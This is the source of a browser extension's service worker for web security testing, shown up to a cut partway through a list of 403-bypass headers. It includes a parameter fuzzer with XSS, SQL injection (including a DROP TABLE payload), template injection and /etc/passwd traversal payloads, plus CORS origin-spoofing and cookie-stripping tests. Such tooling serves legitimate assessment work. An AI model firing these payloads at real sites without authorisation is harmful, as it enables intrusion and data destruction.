/* ═══════════════════════════════════════════════════════════════
   CYBOWARE — Background Service Worker v4
   Enhanced: session persistence, better FP handling, SSTI/CORS/403 fixes
   ═══════════════════════════════════════════════════════════════ */

const tabHeaders = {};
const capturedRequests = {};

// ═══ SERVICE WORKER PERSISTENCE ═══
// Restore captured requests from session storage on wake
chrome.storage.session?.get(['capturedRequests'], (d) => {
  if (d.capturedRequests) Object.assign(capturedRequests, d.capturedRequests);
});
function persistRequests() {
  try { chrome.storage.session?.set({ capturedRequests }); } catch {}
}

chrome.sidePanel.setPanelBehavior({ openPanelOnActionClick: true });

chrome.runtime.onInstalled.addListener(() => {
  chrome.contextMenus.create({ id: 'cyboware-scan', title: 'Cyboware: Scan this page', contexts: ['page'] });
  chrome.contextMenus.create({ id: 'cyboware-lookup', title: 'Cyboware: Lookup "%s"', contexts: ['selection'] });
});

chrome.contextMenus.onClicked.addListener((info, tab) => {
  if (info.menuItemId === 'cyboware-scan') chrome.sidePanel.open({ tabId: tab.id });
});

// Capture main-frame response headers
chrome.webRequest.onHeadersReceived.addListener(
  (d) => {
    if (d.tabId < 0) return;
    if (d.type === 'main_frame') {
      tabHeaders[d.tabId] = { url: d.url, statusCode: d.statusCode, responseHeaders: d.responseHeaders || [] };
    }
    if (d.type === 'xmlhttprequest' || d.type === 'fetch') {
      if (!capturedRequests[d.tabId]) capturedRequests[d.tabId] = [];
      const ex = capturedRequests[d.tabId].find(r => r.requestId === d.requestId);
      if (ex) { ex.statusCode = d.statusCode; ex.responseHeaders = d.responseHeaders; }
      else {
        capturedRequests[d.tabId].push({ requestId: d.requestId, url: d.url, method: d.method || 'GET', statusCode: d.statusCode, responseHeaders: d.responseHeaders || [], timestamp: Date.now() });
      }
      if (capturedRequests[d.tabId].length > 200) capturedRequests[d.tabId] = capturedRequests[d.tabId].slice(-200);
      persistRequests();
    }
  },
  { urls: ['<all_urls>'] }, ['responseHeaders']
);

chrome.webRequest.onBeforeRequest.addListener(
  (d) => {
    if (d.tabId < 0 || (d.type !== 'xmlhttprequest' && d.type !== 'fetch')) return;
    if (!capturedRequests[d.tabId]) capturedRequests[d.tabId] = [];
    if (!capturedRequests[d.tabId].some(r => r.requestId === d.requestId)) {
      const entry = { requestId: d.requestId, url: d.url, method: d.method || 'GET', timestamp: Date.now() };
      if (d.requestBody) {
        if (d.requestBody.formData) entry.body = Object.entries(d.requestBody.formData).map(([k,v]) => `${k}=${v}`).join('&');
        else if (d.requestBody.raw?.length) {
          try { entry.body = new TextDecoder().decode(new Uint8Array(d.requestBody.raw[0].bytes)); } catch {}
        }
      }
      capturedRequests[d.tabId].push(entry);
      if (capturedRequests[d.tabId].length > 200) capturedRequests[d.tabId] = capturedRequests[d.tabId].slice(-200);
      persistRequests();
    }
  },
  { urls: ['<all_urls>'] }, ['requestBody']
);

chrome.webRequest.onSendHeaders.addListener(
  (d) => {
    if (d.tabId < 0 || (d.type !== 'xmlhttprequest' && d.type !== 'fetch' && d.type !== 'main_frame')) return;
    if (d.type === 'main_frame') {
      if (tabHeaders[d.tabId]) tabHeaders[d.tabId].requestHeaders = d.requestHeaders || [];
      return;
    }
    if (!capturedRequests[d.tabId]) return;
    const ex = capturedRequests[d.tabId].find(r => r.requestId === d.requestId);
    if (ex) ex.requestHeaders = d.requestHeaders;
  },
  { urls: ['<all_urls>'] }, ['requestHeaders']
);

chrome.tabs.onRemoved.addListener((id) => { delete tabHeaders[id]; delete capturedRequests[id]; persistRequests(); });

// Message handler
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  const h = handlers[msg.type];
  if (h) { h(msg, sender, sendResponse); return true; }
});

const handlers = {
  GET_HEADERS: (msg, _, sr) => sr({ headers: tabHeaders[msg.tabId] || null }),
  GET_CAPTURED_REQUESTS: (msg, _, sr) => sr({ requests: capturedRequests[msg.tabId] || [] }),

  CLEAR_CAPTURED_REQUESTS: (msg, _, sr) => {
    if (msg.tabId && capturedRequests[msg.tabId]) {
      capturedRequests[msg.tabId] = [];
      persistRequests();
    }
    sr({ ok: true });
  },

  FETCH_URL: async (msg, _, sr) => {
    try {
      const opts = { method: msg.method || 'GET', headers: msg.headers || {}, credentials: 'include' };
      if (msg.body) opts.body = msg.body;
      const res = await fetch(msg.url, opts);
      const text = await res.text();
      const rh = {}; res.headers.forEach((v, k) => { rh[k] = v; });
      sr({ ok: true, status: res.status, statusText: res.statusText, text, headers: rh });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  FETCH_JS: async (msg, _, sr) => {
    try { const r = await fetch(msg.url, { credentials: 'include' }); sr({ ok: true, text: await r.text() }); }
    catch (e) { sr({ ok: false, error: e.message }); }
  },

  ENUM_SUBDOMAINS: async (msg, _, sr) => {
    const domain = msg.domain;
    try {
      const r = await fetch(`https://crt.sh/?q=%25.${encodeURIComponent(domain)}&output=json`, { signal: AbortSignal.timeout(10000) });
      const text = await r.text();
      if (r.ok && !text.trim().startsWith('<')) {
        try {
          const d = JSON.parse(text);
          sr({ ok: true, source: 'crt.sh', subdomains: [...new Set(d.map(e => e.name_value).flatMap(n => n.split('\n')))].sort() });
          return;
        } catch {}
      }
    } catch {}
    try {
      const r2 = await fetch(`https://api.hackertarget.com/hostsearch/?q=${encodeURIComponent(domain)}`, { signal: AbortSignal.timeout(10000) });
      const text2 = await r2.text();
      if (r2.ok && !text2.includes('error') && !text2.startsWith('<')) {
        const subs = text2.trim().split('\n').map(line => line.split(',')[0]).filter(Boolean);
        sr({ ok: true, source: 'hackertarget', subdomains: [...new Set(subs)].sort() });
        return;
      }
    } catch {}
    sr({ ok: false, error: 'Both crt.sh and HackerTarget failed. Try again later.' });
  },

  WAYBACK_LOOKUP: async (msg, _, sr) => {
    try {
      const r = await fetch(`https://web.archive.org/cdx/search/cdx?url=${encodeURIComponent(msg.url)}&output=json&limit=30&fl=timestamp,original,statuscode,mimetype`);
      const d = await r.json();
      sr({ ok: true, snapshots: d.slice(1) });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  TEST_CORS: async (msg, _, sr) => {
    const results = [];
    const targetUrl = new URL(msg.url);
    const targetDomain = targetUrl.hostname;
    const targetOrigin = targetUrl.origin;
    const origins = [
      { origin: 'https://evil.com', label: 'External domain' },
      { origin: 'null', label: 'Null origin' },
      { origin: targetOrigin, label: 'Same origin (baseline)' },
      { origin: `https://sub.${targetDomain}`, label: 'Subdomain reflection' },
      { origin: `https://${targetDomain}.evil.com`, label: 'Domain suffix bypass' },
      { origin: `https://evil${targetDomain}`, label: 'Domain prefix bypass' },
      { origin: `https://evil.com.${targetDomain}`, label: 'Subdomain injection' },
      { origin: 'https://localhost', label: 'Localhost' },
      { origin: `http://${targetDomain}`, label: 'HTTP downgrade' },
    ];
    // Also test preflight (OPTIONS)
    let preflightResult = null;
    try {
      const pr = await fetch(msg.url, { method: 'OPTIONS', headers: { 'Origin': 'https://evil.com', 'Access-Control-Request-Method': 'POST', 'Access-Control-Request-Headers': 'Authorization' }, signal: AbortSignal.timeout(5000) });
      const prAcao = pr.headers.get('access-control-allow-origin');
      const prMethods = pr.headers.get('access-control-allow-methods');
      const prHeaders = pr.headers.get('access-control-allow-headers');
      preflightResult = { status: pr.status, acao: prAcao, methods: prMethods, headers: prHeaders };
    } catch (e) { preflightResult = { error: e.message }; }

    for (const { origin, label } of origins) {
      try {
        const r = await fetch(msg.url, { headers: { 'Origin': origin }, signal: AbortSignal.timeout(5000) });
        const acao = r.headers.get('access-control-allow-origin');
        const acac = r.headers.get('access-control-allow-credentials');
        const reflected = acao === origin;
        const wildcard = acao === '*';
        // Fix: wildcard without credentials is INFO, not VULN
        const vuln = reflected && (label !== 'Same origin (baseline)');
        const wildcardOnly = wildcard && !reflected && (label !== 'Same origin (baseline)');
        const critical = vuln && acac === 'true';
        const wildcardWithCreds = wildcard && acac === 'true'; // impossible per spec but servers misconfigure
        results.push({ origin, label, acao, acac, status: r.status, reflected, wildcard, vuln, critical, wildcardOnly, wildcardWithCreds });
      } catch (e) { results.push({ origin, label, error: e.message }); }
    }
    sr({ ok: true, results, preflight: preflightResult });
  },

  REPLAY_REQUEST: async (msg, _, sr) => {
    try {
      const opts = { method: msg.method || 'GET', headers: msg.headers || {}, credentials: 'include' };
      if (msg.body) opts.body = msg.body;
      const r = await fetch(msg.url, opts);
      const text = await r.text();
      const rh = {}; r.headers.forEach((v, k) => { rh[k] = v; });
      sr({ ok: true, status: r.status, statusText: r.statusText, text, headers: rh });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  GET_PAGE_REQUEST_RESPONSE: async (msg, _, sr) => {
    try {
      const r = await fetch(msg.url, { headers: msg.headers || {}, credentials: 'include' });
      const text = await r.text();
      const respHeaders = {}; r.headers.forEach((v, k) => { respHeaders[k] = v; });
      const u = new URL(msg.url);
      let reqStr = `GET ${u.pathname}${u.search} HTTP/1.1\r\nHost: ${u.hostname}\r\n`;
      if (msg.headers) Object.entries(msg.headers).forEach(([k, v]) => { reqStr += `${k}: ${v}\r\n`; });
      reqStr += '\r\n';
      let resStr = `HTTP/1.1 ${r.status} ${r.statusText}\r\n`;
      Object.entries(respHeaders).forEach(([k, v]) => { resStr += `${k}: ${v}\r\n`; });
      resStr += `\r\n${text}`;
      sr({ ok: true, request: reqStr, response: resStr, status: r.status, headers: respHeaders, body: text });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  TAKE_SCREENSHOT: async (msg, _, sr) => {
    try { sr({ ok: true, dataUrl: await chrome.tabs.captureVisibleTab(null, { format: 'png' }) }); }
    catch (e) { sr({ ok: false, error: e.message }); }
  },

  GET_COOKIES: async (msg, _, sr) => {
    try { sr({ ok: true, cookies: await chrome.cookies.getAll({ domain: msg.domain }) }); }
    catch (e) { sr({ ok: false, error: e.message }); }
  },

  DELETE_COOKIE: async (msg, _, sr) => {
    try { await chrome.cookies.remove({ url: msg.url, name: msg.name }); sr({ ok: true }); }
    catch (e) { sr({ ok: false, error: e.message }); }
  },

  TEST_AUTH: async (msg, _, sr) => {
    try {
      const domain = msg.domain;
      const url = msg.url;
      const baseline = await fetch(url, { credentials: 'include', redirect: 'manual', signal: AbortSignal.timeout(6000) });
      const baseStatus = baseline.status;
      const baseLen = (await baseline.text()).length;
      const allCookies = await chrome.cookies.getAll({ domain });
      // Remove all
      for (const c of allCookies) {
        const cUrl = (c.secure ? 'https://' : 'http://') + c.domain.replace(/^\./, '') + c.path;
        try { await chrome.cookies.remove({ url: cUrl, name: c.name }); } catch {}
      }
      const noCookieRes = await fetch(url, { credentials: 'include', redirect: 'manual', signal: AbortSignal.timeout(6000) });
      const noStatus = noCookieRes.status;
      const noLen = (await noCookieRes.text()).length;
      // Restore all
      for (const c of allCookies) {
        const cUrl = (c.secure ? 'https://' : 'http://') + c.domain.replace(/^\./, '') + c.path;
        try { await chrome.cookies.set({ url: cUrl, name: c.name, value: c.value, domain: c.domain, path: c.path, secure: c.secure, httpOnly: c.httpOnly, sameSite: c.sameSite === 'unspecified' ? 'no_restriction' : c.sameSite, expirationDate: c.expirationDate || undefined }); } catch {}
      }
      const results = [];
      const testCookies = msg.cookieNames || allCookies.map(c => c.name);
      for (const name of testCookies) {
        const c = allCookies.find(x => x.name === name);
        if (!c) { results.push({ name, status: 'skip', significant: false, role: 'unknown' }); continue; }
        const cUrl = (c.secure ? 'https://' : 'http://') + c.domain.replace(/^\./, '') + c.path;
        try {
          await chrome.cookies.remove({ url: cUrl, name: c.name });
          const r = await fetch(url, { credentials: 'include', redirect: 'manual', signal: AbortSignal.timeout(5000) });
          const body = await r.text();
          const statusChanged = r.status !== baseStatus;
          const bodyDiff = Math.abs(body.length - baseLen);
          const significant = statusChanged || bodyDiff > 200;
          results.push({ name, status: r.status, bodyLen: body.length, statusChanged, bodyDiff, significant, role: significant ? 'auth' : 'not-needed' });
          await chrome.cookies.set({ url: cUrl, name: c.name, value: c.value, domain: c.domain, path: c.path, secure: c.secure, httpOnly: c.httpOnly, sameSite: c.sameSite === 'unspecified' ? 'no_restriction' : c.sameSite, expirationDate: c.expirationDate || undefined });
        } catch (e) {
          try { await chrome.cookies.set({ url: cUrl, name: c.name, value: c.value, domain: c.domain, path: c.path, secure: c.secure, httpOnly: c.httpOnly, sameSite: c.sameSite === 'unspecified' ? 'no_restriction' : c.sameSite, expirationDate: c.expirationDate || undefined }); } catch {}
          results.push({ name, status: 'err', significant: false, role: 'unknown' });
        }
      }
      sr({ ok: true, baseStatus, baseLen, noStatus, noLen, siteUsesAuth: baseStatus !== noStatus || Math.abs(baseLen - noLen) > 200, results });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  GET_TABS: async (_, __, sr) => {
    const tabs = await chrome.tabs.query({ currentWindow: true });
    sr({ tabs: tabs.map(t => ({ id: t.id, url: t.url, title: t.title, active: t.active })) });
  },

  DNS_LOOKUP: async (msg, _, sr) => {
    try {
      const types = ['A', 'AAAA', 'MX', 'TXT', 'NS', 'CNAME'];
      const results = {};
      for (const type of types) {
        try {
          const r = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(msg.domain)}&type=${type}`);
          const d = await r.json();
          if (d.Answer) results[type] = d.Answer.map(a => a.data);
        } catch {}
      }
      const emailSecurity = { spf: null, dmarc: null, findings: [] };
      const txts = results.TXT || [];
      const spfRecord = txts.find(t => t.toLowerCase().includes('v=spf1'));
      if (spfRecord) {
        emailSecurity.spf = spfRecord;
        if (spfRecord.includes('+all')) emailSecurity.findings.push({ severity: 'high', text: 'SPF +all — allows ANY server to send email (spoofable)' });
        else if (spfRecord.includes('~all')) emailSecurity.findings.push({ severity: 'medium', text: 'SPF ~all (softfail) — emails may still be delivered (spoofable with effort)' });
        else if (spfRecord.includes('?all')) emailSecurity.findings.push({ severity: 'medium', text: 'SPF ?all (neutral) — no enforcement' });
        else if (spfRecord.includes('-all')) emailSecurity.findings.push({ severity: 'low', text: 'SPF -all (hardfail) — properly configured' });
      } else {
        emailSecurity.findings.push({ severity: 'high', text: 'No SPF record — email spoofing possible' });
      }
      try {
        const dr = await fetch(`https://dns.google/resolve?name=_dmarc.${encodeURIComponent(msg.domain)}&type=TXT`);
        const dd = await dr.json();
        if (dd.Answer) {
          const dmarcRec = dd.Answer.find(a => a.data.includes('v=DMARC1'));
          if (dmarcRec) {
            emailSecurity.dmarc = dmarcRec.data;
            if (dmarcRec.data.includes('p=none')) emailSecurity.findings.push({ severity: 'medium', text: 'DMARC p=none — monitoring only, no enforcement' });
            else if (dmarcRec.data.includes('p=quarantine')) emailSecurity.findings.push({ severity: 'low', text: 'DMARC p=quarantine — suspicious mail quarantined' });
            else if (dmarcRec.data.includes('p=reject')) emailSecurity.findings.push({ severity: 'low', text: 'DMARC p=reject — properly configured' });
          } else {
            emailSecurity.findings.push({ severity: 'high', text: 'No DMARC record — email spoofing possible' });
          }
        } else {
          emailSecurity.findings.push({ severity: 'high', text: 'No DMARC record — email spoofing possible' });
        }
      } catch {}
      sr({ ok: true, records: results, emailSecurity });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  WHOIS_LOOKUP: async (msg, _, sr) => {
    try {
      const r = await fetch(`https://rdap.org/domain/${encodeURIComponent(msg.domain)}`);
      const d = await r.json();
      sr({ ok: true, data: d });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  LIVE_HEADERS: async (msg, _, sr) => {
    try {
      const r = await fetch(msg.url, { credentials: 'include', redirect: 'follow' });
      const respHeaders = {};
      r.headers.forEach((v, k) => { respHeaders[k] = v; });
      const body = await r.text();
      sr({ ok: true, status: r.status, statusText: r.statusText, url: r.url, headers: respHeaders, bodyPreview: body.slice(0, 500) });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  DETECT_WP_PLUGINS: async (msg, _, sr) => {
    try {
      const r = await fetch(msg.url, { credentials: 'include' });
      const html = await r.text();
      const plugins = new Map();
      const re = /wp-content\/plugins\/([a-zA-Z0-9_-]+)(?:\/[^?"'\s]*)?(?:\?ver=([0-9.]+))?/g;
      let m;
      while ((m = re.exec(html)) !== null) {
        const name = m[1];
        const ver = m[2] || '';
        if (!plugins.has(name) || (ver && !plugins.get(name))) plugins.set(name, ver);
      }
      const themes = new Set();
      const reT = /wp-content\/themes\/([a-zA-Z0-9_-]+)/g;
      while ((m = reT.exec(html)) !== null) themes.add(m[1]);
      const wpVer = html.match(/<meta[^>]*name="generator"[^>]*content="WordPress\s*([^"]*)"/) ;
      sr({ ok: true, plugins: [...plugins.entries()].map(([n,v]) => ({name:n,version:v})), themes: [...themes], wpVersion: wpVer ? wpVer[1] : null });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  // ═══ PARAMETER FUZZER — Enhanced SSTI numbers, baseline comparison ═══
  PARAM_FUZZ: async (msg, _, sr) => {
    const payloads = {
      xss: [
        { p: '<script>alert(1)</script>', check: 'unencoded_html' },
        { p: '"><img src=x onerror=alert(1)>', check: 'unencoded_html' },
        { p: '<svg/onload=alert(1)>', check: 'unencoded_html' },
        { p: 'cyboXSS"onmouseover="alert(1)', check: 'unencoded_attr' },
        { p: '<svg\tonload=alert(1)>', check: 'unencoded_html' },
        { p: '<details open ontoggle=alert(1)>', check: 'unencoded_html' },
        { p: '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>', check: 'unencoded_html' },
        { p: '%253Csvg%2520onload%253Dalert(1)%253E', check: 'reflected' },
        { p: 'javascript:alert(1)//', check: 'reflected' },
        { p: '<svg onload=\u0061lert(1)>', check: 'unencoded_html' },
      ],
      sqli: [
        { p: "' OR '1'='1", check: 'sqli_error' },
        { p: "1' AND '1'='1", check: 'sqli_error' },
        { p: "' UNION SELECT NULL--", check: 'sqli_error' },
        { p: "1; DROP TABLE--", check: 'sqli_error' },
        { p: "1'/*!50000OR*/'1'='1", check: 'sqli_error' },
        { p: "' uNiOn SeLeCt NULL--", check: 'sqli_error' },
        { p: "%27%20OR%201%3D1--", check: 'sqli_error' },
        { p: "' AND extractvalue(1,concat(0x7e,version()))--", check: 'sqli_error' },
        // Time-based blind SQLi
        { p: "' OR SLEEP(4)--", check: 'sqli_blind_time' },
        { p: "'; WAITFOR DELAY '0:0:4'--", check: 'sqli_blind_time' },
        { p: "' || pg_sleep(4)--", check: 'sqli_blind_time' },
        { p: "1; SELECT SLEEP(4)--", check: 'sqli_blind_time' },
      ],
      ssti: [
        // Enhanced: use much larger/unique numbers to reduce false positives
        { p: '{{7777777*3333333}}', check: 'ssti_eval', expect: '25925558641' },
        { p: '${9182736+4455667}', check: 'ssti_eval', expect: '13638403' },
        { p: '<%= 8372615*7 %>', check: 'ssti_eval', expect: '58608305' },
        { p: '#{6192837+4}', check: 'ssti_eval', expect: '6192841' },
        { p: '{{config.__class__.__init__.__globals__}}', check: 'reflected' },
        { p: '{{_self.env.display("id")}}', check: 'reflected' },
      ],
      path: [
        { p: '../../../etc/passwd', check: 'file_content' },
        { p: '....//....//etc/passwd', check: 'file_content' },
        { p: '..\\..\\..\\windows\\win.ini', check: 'file_content_win' },
        { p: '../../../etc/passwd%00', check: 'file_content' },
        { p: '%2e%2e/%2e%2e/%2e%2e/etc/passwd', check: 'file_content' },
        { p: '%252e%252e/%252e%252e/etc/passwd', check: 'file_content' },
      ],
    };

    const sqliErrors = ['sql syntax', 'mysql', 'sqlite', 'postgresql', 'ora-', 'syntax error', 'unclosed quotation', 'unterminated string', 'SQLSTATE', 'microsoft sql', 'odbc', 'jdbc', 'quoted string not properly terminated'];

    try {
      const results = [];
      const baseUrl = new URL(msg.url);
      const params = [...baseUrl.searchParams.keys()];
      if (!params.length) { sr({ ok: true, results: [], params: [], message: 'No URL parameters found. Add ?param=value to test.' }); return; }

      const category = msg.category || 'xss';
      const testPayloads = [...(payloads[category] || payloads.xss)];
      if (msg.customPayloads && msg.customPayloads.length) {
        msg.customPayloads.forEach(cp => testPayloads.push({ p: cp, check: 'reflected' }));
      }

      // Baseline timing
      let baselineLen = 0;
      let baselineBody = '';
      let baselineTime = 0;
      try {
        const t0 = Date.now();
        const br = await fetch(msg.url, { credentials: 'include', signal: AbortSignal.timeout(10000) });
        baselineTime = Date.now() - t0;
        baselineBody = await br.text();
        baselineLen = baselineBody.length;
      } catch {}

      // Enhanced: test all payloads, not just first 4
      const maxPayloads = msg.maxPayloads || testPayloads.length;
      const maxParams = msg.maxParams || Math.min(params.length, 8);
      const selectedParams = msg.selectedParams || null;

      const targetParams = selectedParams ? params.filter(p => selectedParams.includes(p)) : params.slice(0, maxParams);
      for (const param of targetParams) {
        for (const { p: payload, check, expect } of testPayloads.slice(0, maxPayloads)) {
          const testUrl = new URL(msg.url);
          testUrl.searchParams.set(param, payload);
          const isTimeBased = check === 'sqli_blind_time';
          try {
            const t0 = Date.now();
            const r = await fetch(testUrl.toString(), { credentials: 'include', redirect: 'follow', signal: AbortSignal.timeout(isTimeBased ? 15000 : 5000) });
            const elapsed = Date.now() - t0;
            const body = await r.text();
            const rawReflected = body.includes(payload);

            let context = '';
            if (rawReflected) {
              const idx = body.indexOf(payload);
              const start = Math.max(0, idx - 80);
              const end = Math.min(body.length, idx + payload.length + 80);
              context = body.slice(start, end);
            }

            let severity = 'safe';
            let analysis = '';

            if (check === 'unencoded_html') {
              const htmlEncoded = body.includes(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'));
              if (rawReflected && !htmlEncoded) {
                const inTitle = context.includes('<title') && context.includes('</title');
                const inMeta = context.includes('<meta');
                const inComment = context.includes('<!--');
                if (inTitle || inMeta || inComment) {
                  severity = 'low';
                  analysis = 'Reflected unencoded but inside safe context (' + (inTitle?'title':inMeta?'meta':'comment') + ')';
                } else {
                  severity = 'high';
                  analysis = 'Payload reflected UNENCODED in HTML body — likely XSS!';
                }
              } else if (htmlEncoded) {
                severity = 'safe';
                analysis = 'Reflected but HTML-encoded (safe)';
              } else {
                severity = 'safe';
                analysis = 'Not reflected';
              }
            } else if (check === 'unencoded_attr') {
              if (rawReflected && context.includes('"') && !body.includes(payload.replace(/"/g, '&quot;'))) {
                severity = 'high';
                analysis = 'Quote character reflected unencoded — attribute breakout possible';
              } else {
                severity = rawReflected ? 'low' : 'safe';
                analysis = rawReflected ? 'Reflected but quotes encoded' : 'Not reflected';
              }
            } else if (check === 'ssti_eval') {
              // Enhanced: larger numbers = far fewer false positives
              const evalRegex = new RegExp('(?<![0-9a-fA-F])' + expect + '(?![0-9a-fA-F])');
              const evalMatch = evalRegex.exec(body);
              if (evalMatch && !rawReflected) {
                const matchIdx = evalMatch.index;
                const surrounding = body.slice(Math.max(0, matchIdx - 40), Math.min(body.length, matchIdx + expect.length + 40));
                const inHex = /[0-9a-f]{12,}/i.test(surrounding);
                const inHash = /sha|hash|key|token|id.*=.*[0-9a-f]/i.test(surrounding);
                // Also check if number existed in baseline
                const inBaseline = baselineBody.includes(expect);
                if (inHex || inHash || inBaseline) {
                  severity = 'safe';
                  analysis = inBaseline ? 'Number already present in baseline response — false positive' : 'Number found but inside hex/hash/ID string — false positive';
                } else {
                  severity = 'high';
                  analysis = 'Template expression EVALUATED — ' + payload + ' = ' + expect + '!';
                  context = surrounding;
                }
              } else if (rawReflected) {
                severity = 'safe';
                analysis = 'Literal syntax echoed back (not evaluated) — no template engine processed it';
              } else {
                severity = 'safe';
                analysis = 'Not reflected, not evaluated';
              }
            } else if (check === 'sqli_error') {
              const bodyLower = body.toLowerCase();
              const errorFound = sqliErrors.find(e => bodyLower.includes(e));
              const lenDiff = Math.abs(body.length - baselineLen);
              // Enhanced: check if the error already existed in baseline
              const errorInBaseline = errorFound && baselineBody.toLowerCase().includes(errorFound);
              if (errorFound && !errorInBaseline) {
                severity = 'high';
                analysis = 'SQL error detected: "' + errorFound + '"';
                const errIdx = bodyLower.indexOf(errorFound);
                context = body.slice(Math.max(0, errIdx - 40), Math.min(body.length, errIdx + errorFound.length + 80));
              } else if (errorFound && errorInBaseline) {
                severity = 'safe';
                analysis = 'SQL-related text found but also present in baseline — likely page content, not injection';
              } else if (r.status === 500 && baselineLen > 0 && body !== baselineBody) {
                severity = 'medium';
                analysis = 'Server error (500) on payload — possible SQL injection';
              } else if (lenDiff > 5000) {
                severity = 'low';
                analysis = 'Significant response size change (' + lenDiff + ' bytes) — investigate';
              } else {
                severity = 'safe';
                analysis = 'No SQL errors detected';
              }
            } else if (check === 'sqli_blind_time') {
              const timeDiff = elapsed - baselineTime;
              if (timeDiff > 3000) {
                severity = 'high';
                analysis = 'Response delayed ' + (elapsed/1000).toFixed(1) + 's (baseline ' + (baselineTime/1000).toFixed(1) + 's) — TIME-BASED BLIND SQLi!';
              } else if (timeDiff > 1500) {
                severity = 'medium';
                analysis = 'Slight delay ' + (elapsed/1000).toFixed(1) + 's (baseline ' + (baselineTime/1000).toFixed(1) + 's) — investigate';
              } else {
                severity = 'safe';
                analysis = 'No delay (' + (elapsed/1000).toFixed(1) + 's)';
              }
            } else if (check === 'file_content' || check === 'file_content_win') {
              const fileIndicators = check === 'file_content'
                ? ['root:', '/bin/bash', '/bin/sh', 'daemon:', 'nobody:']
                : ['[extensions]', '[fonts]', '[mci extensions]'];
              const found = fileIndicators.find(f => body.includes(f));
              if (found) {
                severity = 'high';
                analysis = 'File content detected: "' + found + '" — path traversal confirmed!';
                const fIdx = body.indexOf(found);
                context = body.slice(Math.max(0, fIdx - 20), Math.min(body.length, fIdx + 100));
              } else if (rawReflected) {
                severity = 'safe';
                analysis = 'Path reflected in page (e.g. search query) but no file content — false positive';
              } else {
                severity = 'safe';
                analysis = 'Not reflected, no file content';
              }
            } else {
              severity = rawReflected ? 'low' : 'safe';
              analysis = rawReflected ? 'Reflected (manual review needed)' : 'Not reflected';
            }

            let errorBody = '';
            if (r.status >= 500 && body.length < 5000) {
              errorBody = body.slice(0, 500);
            }
            results.push({ param, payload, severity, analysis, status: r.status, bodyLen: body.length, elapsed, context: severity !== 'safe' ? context : '', url: testUrl.toString(), errorBody, responsePreview: body.slice(0, 600) });
          } catch (e) {
            results.push({ param, payload, severity: 'info', analysis: 'Request failed: ' + e.message, error: e.message });
          }
        }
      }
      sr({ ok: true, params, results, baselineLen, testedPayloads: Math.min(maxPayloads, testPayloads.length), totalPayloads: testPayloads.length });
    } catch (e) { sr({ ok: false, error: e.message }); }
  },

  // CSP Evaluator
  EVALUATE_CSP: (msg, _, sr) => {
    const csp = msg.csp;
    if (!csp) { sr({ ok: false, error: 'No CSP header' }); return; }
    const findings = [];
    const directives = {};
    csp.split(';').forEach(d => {
      const parts = d.trim().split(/\s+/);
      if (parts.length) directives[parts[0]] = parts.slice(1);
    });

    const checkUnsafe = (dir, values) => {
      if (!values) { findings.push({ severity: 'high', directive: dir, issue: 'Missing directive', detail: `No ${dir} defined — falls back to default-src or allows everything` }); return; }
      if (values.includes("'unsafe-inline'")) findings.push({ severity: 'high', directive: dir, issue: 'unsafe-inline', detail: 'Allows inline scripts/styles — XSS bypass' });
      if (values.includes("'unsafe-eval'")) findings.push({ severity: 'high', directive: dir, issue: 'unsafe-eval', detail: 'Allows eval() — XSS bypass via dynamic code execution' });
      if (values.includes('*')) findings.push({ severity: 'high', directive: dir, issue: 'Wildcard', detail: 'Allows loading from any origin' });
      if (values.some(v => v === 'data:')) findings.push({ severity: 'medium', directive: dir, issue: 'data: URI', detail: 'Allows data: URIs — potential XSS vector' });
      if (values.some(v => v === 'blob:')) findings.push({ severity: 'low', directive: dir, issue: 'blob: URI', detail: 'Allows blob: URIs' });
      const cdnBypasses = ['cdn.jsdelivr.net', 'cdnjs.cloudflare.com', 'unpkg.com', 'raw.githubusercontent.com', 'ajax.googleapis.com', 'cdn.rawgit.com'];
      values.forEach(v => { if (cdnBypasses.some(c => v.includes(c))) findings.push({ severity: 'medium', directive: dir, issue: 'CDN bypass', detail: `${v} — known CSP bypass via hosted libraries` }); });
      values.forEach(v => { if (v.startsWith('*.') || v === 'https:' || v === 'http:') findings.push({ severity: 'medium', directive: dir, issue: 'Overly broad', detail: `${v} is too permissive` }); });
    };

    checkUnsafe('script-src', directives['script-src'] || directives['default-src']);
    checkUnsafe('style-src', directives['style-src'] || directives['default-src']);
    checkUnsafe('img-src', directives['img-src']);
    checkUnsafe('connect-src', directives['connect-src']);
    checkUnsafe('frame-src', directives['frame-src'] || directives['child-src']);
    checkUnsafe('object-src', directives['object-src']);
    if (!directives['object-src']) findings.push({ severity: 'medium', directive: 'object-src', issue: 'Missing object-src', detail: "No object-src — allows Flash/plugins unless blocked by default-src" });
    if (!directives['base-uri']) findings.push({ severity: 'medium', directive: 'base-uri', issue: 'Missing base-uri', detail: "No base-uri — allows <base> tag hijacking" });
    if (!directives['form-action']) findings.push({ severity: 'low', directive: 'form-action', issue: 'Missing form-action', detail: "No form-action — forms can submit to any origin" });
    if (!directives['frame-ancestors']) findings.push({ severity: 'medium', directive: 'frame-ancestors', issue: 'Missing frame-ancestors', detail: "No frame-ancestors — page can be framed (clickjacking)" });

    const highCount = findings.filter(f => f.severity === 'high').length;
    const medCount = findings.filter(f => f.severity === 'medium').length;
    const grade = highCount === 0 && medCount <= 1 ? 'A' : highCount === 0 ? 'B' : highCount <= 2 ? 'C' : highCount <= 4 ? 'D' : 'F';

    sr({ ok: true, directives, findings, grade, raw: csp });
  },

  // ═══ 403 BYPASS — Enhanced: body comparison against homepage ═══
  BYPASS_403: async (msg, _, sr) => {
    const url = msg.url;
    const u = new URL(url);
    const path = u.pathname;
    const techniques = [
      { type: 'header', name: 'X-Forwarded-For: 127.0.0.1', headers: { 'X-Forwarded-For': '127.0.0.1' } },
      { type: 'header', name: 'X-Forwarded-Host: 127.0.0.1', headers: { 'X-Forwarded-Host': '127.0.0.1' } },
      { type: 'header', name: 'X-Original-URL: ' + path, headers: { 'X-Original-URL': path } },
